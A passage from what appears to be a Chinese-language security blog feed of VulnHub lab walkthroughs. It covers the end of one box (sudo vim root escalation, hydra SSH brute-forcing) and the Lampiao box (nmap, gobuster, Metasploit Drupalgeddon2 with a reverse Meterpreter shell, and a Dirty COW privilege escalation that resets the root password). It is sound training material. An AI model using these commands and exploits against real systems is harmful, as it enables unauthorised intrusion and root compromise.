<span class="hljs-built_in">id</span><br>uid=1001(hackathonll) gid=1001(hackathonll) <span class="hljs-built_in">groups</span>=1001(hackathonll)<br></code></pre></td></tr></table></figure></li></ul><h1 id="提权-vim"><a href="#提权-vim" class="headerlink" title="提权-vim"></a>提权-vim</h1><p>（1）使用<code>sudo -l</code>，查看有没有不需要密码也可以执行<code>root</code>权限的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> hackathonll on hackathon:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User hackathonll may run the following commands on hackathon:<br>    (root) NOPASSWD: /usr/bin/vim<br></code></pre></td></tr></table></figure><ul><li>发现<code>vim</code>不需要密码即可以<code>root</code>权限执行<br>（2）执行提权命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br><br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure></li><li>命令链接：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li></ul><p><strong>读取第二个flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/flag2.txt</span><br>₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）ftp的渗透，尝试用<code>anonymous </code>和空密码登录，成功登录后，使用<code>ls</code>查看服务器里面有什么文件，使用get下载到本地<br>（2）<code>hydra</code>爆破，使用教程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L users.txt -P pass.txt ssh://ip -f<br>targetIP是目标服务器的IP地址<br>ftp 是协议<br>-L 指定一个帐号字典<br>-l 指定用户<br>-P 指定一个密码字典<br>-p 指定密码<br>-V 现实爆破测试的详细过程<br>-f 成功爆破一个账号就停止爆破<br></code></pre></td></tr></table></figure><p>（3）vim提权，首先输入<code>sudo -l</code>，查看哪些命令不需要输入密码即可执行root权限，然后执行相关的提权命令，<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ftp</tag>
      
      <tag>hydra</tag>
      
      <tag>提权-sudo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lampiao</title>
    <link href="/vulnhub/Lampiao/"/>
    <url>/vulnhub/Lampiao/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00068s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00043s latency).<br>MAC Address: 08:00:27:07:6D:A0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00067s latency).<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.07 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.10 -oA nmapscan/ports            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0021s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1898/tcp open  cymtec-port<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 22.19 seconds<br></code></pre></td></tr></table></figure><ul><li>发现开放端口22,80,1898<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,1898 192.168.2.10 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http?<br>1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port80-TCP:V=7.94SVN%I=7%D=2/8%Time=67A6C09D%P=x86_64-pc-linux-gnu%r(NU<br>SF:LL,1179,<span class="hljs-string">&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="hljs-string">SF:\|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\</span><br><span class="hljs-string">SF:__,_\|_\|\x20\|_\|&quot;</span>);<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 52.18 seconds<br></code></pre></td></tr></table></figure>（3）进行UDP扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,1898 192.168.2.10 -oA nmapscan/udp                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00095s latency).<br><br>PORT     STATE  SERVICE<br>22/udp   closed ssh<br>80/udp   closed http<br>1898/udp closed cymtec-port<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.49 seconds<br></code></pre></td></tr></table></figure></li><li>没有开放的udp端口<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,1898 192.168.2.10 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0012s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)<br>|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">1898/tcp open  cymtec-port</span><br><span class="hljs-string">MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 49.75 seconds</span><br></code></pre></td></tr></table></figure></li><li>没有扫描出漏洞</li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，是一个静态页面，查看页面源码，没有发现有用的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081035901.png"><br>（2）进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.10<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>Error: error on running gobuster: unable to connect to http://192.168.2.10/: Get <span class="hljs-string">&quot;http://192.168.2.10/&quot;</span>: <span class="hljs-built_in">read</span> tcp 192.168.2.4:38794-&gt;192.168.2.10:80: <span class="hljs-built_in">read</span>: connection reset by peer<br></code></pre></td></tr></table></figure><ul><li>发现无法连接到80端口</li></ul><h2 id="1898端口渗透"><a href="#1898端口渗透" class="headerlink" title="1898端口渗透"></a>1898端口渗透</h2><p>（1）访问1898端口，发现使用的cms是<code>drupal</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081051355.png"><br>（2）对1898端口进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.10:1898 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.10:1898<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 286]<br>/.php                 (Status: 403) [Size: 285]<br>/misc                 (Status: 301) [Size: 317] [--&gt; http://192.168.2.10:1898/misc/]<br>/themes               (Status: 301) [Size: 319] [--&gt; http://192.168.2.10:1898/themes/]<br>/modules              (Status: 301) [Size: 320] [--&gt; http://192.168.2.10:1898/modules/]<br>/scripts              (Status: 301) [Size: 320] [--&gt; http://192.168.2.10:1898/scripts/]<br>/index.php            (Status: 200) [Size: 11400]<br>/sites                (Status: 301) [Size: 318] [--&gt; http://192.168.2.10:1898/sites/]<br>/includes             (Status: 301) [Size: 321] [--&gt; http://192.168.2.10:1898/includes/]<br>/profiles             (Status: 301) [Size: 321] [--&gt; http://192.168.2.10:1898/profiles/]<br>/update.php           (Status: 403) [Size: 4129]<br>/install.php          (Status: 200) [Size: 3257]<br>/robots.txt           (Status: 200) [Size: 2189]<br>/cron.php             (Status: 403) [Size: 7390]<br>/xmlrpc.php           (Status: 200) [Size: 42]<br>/.php                 (Status: 403) [Size: 285]<br>/.html                (Status: 403) [Size: 286]<br>/server-status        (Status: 403) [Size: 294]<br>/authorize.php        (Status: 403) [Size: 2896]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><ul><li><p>发现挺多的敏感文件，访问<code>robots.txt</code>，找到<code>CHANGELOG.txt</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102193.png"></p></li><li><p>发现该框架<code>drupal</code>的版本信息为<code>7.54</code>，时间为2017年2月1日<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102339.png"></p></li></ul><h2 id="cms-drupal渗透"><a href="#cms-drupal渗透" class="headerlink" title="cms-drupal渗透"></a>cms-drupal渗透</h2><p>（1）通过上述的渗透，最终确认该系统使用的CMS是<code>drupal</code>，版本为<code>7.54</code>，时间为<code>2017-02-01</code>，通过Google搜索17年以后的漏洞或者使用msf进行搜索</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ msfconsole    <br>Metasploit tip: Use the edit <span class="hljs-built_in">command</span> to open the currently active module <br><span class="hljs-keyword">in</span> your editor<br>                                                  <br><span class="hljs-comment"># cowsay++</span><br> ____________<br>&lt; metasploit &gt;<br> ------------<br>       \   ,__,<br>        \  (oo)____<br>           (__)    )\<br>              ||--|| *<br><br><br>       =[ metasploit v6.4.20-dev                          ]<br>+ -- --=[ 2440 exploits - 1256 auxiliary - 429 post       ]<br>+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span><br>   -   ----                                                              ---------------  ----       -----  -----------<br>   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution<br>   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>   2     \_ target: Automatic (PHP In-Memory)                            <br>   3     \_ target: Automatic (PHP Dropper)                              <br>   4     \_ target: Automatic (Unix In-Memory)                           <br>   5     \_ target: Automatic (Linux Dropper)                            <br>   6     \_ target: Drupal 7.x (PHP In-Memory)                           <br>   7     \_ target: Drupal 7.x (PHP Dropper)                             <br>   8     \_ target: Drupal 7.x (Unix In-Memory)                          <br>   9     \_ target: Drupal 7.x (Linux Dropper)                           <br>   10    \_ target: Drupal 8.x (PHP In-Memory)                           <br>   11    \_ target: Drupal 8.x (PHP Dropper)                             <br>   12    \_ target: Drupal 8.x (Unix In-Memory)                          <br>   13    \_ target: Drupal 8.x (Linux Dropper)                           <br>   14    \_ AKA: SA-CORE-2018-002                                        <br>   15    \_ AKA: Drupalgeddon 2                                          <br>   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection<br>   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  <br>   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   <br>   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection<br>   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution<br>   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE<br>   22    \_ target: PHP In-Memory                                        <br>   23    \_ target: Unix In-Memory                                       <br>   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration<br>   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br>Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval<br><br></code></pre></td></tr></table></figure><p>（2）结合搜集到信息，选择<code>drupal_drupalgeddon2 2018-03-28</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>（3）进行相关的设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> lhost 192.168.2.4<br>lhost =&gt; 192.168.2.4<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhost 192.168.2.10<br>rhost =&gt; 192.168.2.10<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rport 1898<br>rport =&gt; 1898<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show option<br>sf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.2.4:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target is vulnerable.<br>[*] Sending stage (39927 bytes) to 192.168.2.10<br>[*] Meterpreter session 1 opened (192.168.2.4:4444 -&gt; 192.168.2.10:45742) at 2025-02-08 11:20:51 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（4）输入<code>shell</code>，成功进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 4974 created.<br>Channel 0 created.<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>（5）获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@lampiao:/var/www/html$ <br></code></pre></td></tr></table></figure><h1 id="提权-dirtycow"><a href="#提权-dirtycow" class="headerlink" title="提权-dirtycow"></a>提权-dirtycow</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>进行提权，将脚本上传至临时目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（2）进行命令交互界面，给脚本添加执行权限，并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 5651 created.<br>Channel 2 created.<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@lampiao:/var/www/html$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@lampiao:/tmp$ <span class="hljs-built_in">chmod</span> +x 1.sh    <br><span class="hljs-built_in">chmod</span> +x 1.sh<br>www-data@lampiao:/tmp$ ./1.sh<br>./1.sh<br></code></pre></td></tr></table></figure><p>（3）根据执行的结果，选择相关的漏洞进行利用（一般选择有颜色的进行利用）<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081139012.png"><br>（4）选择<code>CVE-2016-5195</code>进行利用</p><ul><li>利用脚本：<a href="https://github.com/gbonacini/CVE-2016-5195%EF%BC%8C%E5%B0%86%E8%84%9A%E6%9C%AC%E4%B8%8A%E4%BC%A0%E8%87%B3%E7%9B%AE%E5%BD%95/tmp">https://github.com/gbonacini/CVE-2016-5195，将脚本上传至目录/tmp</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/CVE-2016-5195-master/ /tmp/<br><br></code></pre></td></tr></table></figure></li><li>对<code>dcow.cpp</code>进行编译<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br></code></pre></td></tr></table></figure>（5）执行<code>dcow</code>，对密码进行重置<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ ./dcow<br>./dcow<br>Running ...<br>Received su prompt (Password: )<br>Root password is:   dirtyCowFun<br>Enjoy! :-)<br></code></pre></td></tr></table></figure>（6）切换到<code>root</code>用户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ su root<br>su root<br>Password: dirtyCowFun<br><br>root@lampiao:/tmp#<br></code></pre></td></tr></table></figure></li></ul><p><strong>读取flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lampiao:~# <span class="hljs-built_in">cat</span> 